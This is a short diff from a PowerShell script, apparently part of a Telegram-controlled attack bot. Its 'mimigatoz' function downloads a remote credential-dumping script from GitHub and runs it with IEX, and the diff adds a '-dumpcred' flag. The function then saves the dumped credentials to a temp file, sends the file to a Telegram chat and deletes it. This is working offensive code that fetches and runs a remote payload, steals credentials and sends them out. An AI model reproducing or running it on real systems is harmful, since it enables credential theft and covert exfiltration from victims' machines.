@@ -167,7 +167,7 @@ $result = New-Object psobject -Property @{
 
 function mimigatoz {
 $ruta = $env:USERPROFILE + "\appdata\local\temp\1"; if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}; $ruta = $ruta + "\mimigatoz.txt"
-IEX (curl https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/Funciones/Invoke-MimiGatoz.ps1) | Out-File  $ruta
+IEX (curl https://raw.githubusercontent.com/Hackplayers/PSBoTelegram/master/Funciones/Invoke-MimiGatoz.ps1) -dumpcred | Out-File  $ruta
 bot-send -file $ruta -botkey $botkey -chat_id $chat_id
 sleep -Seconds 5
 Remove-Item $ruta
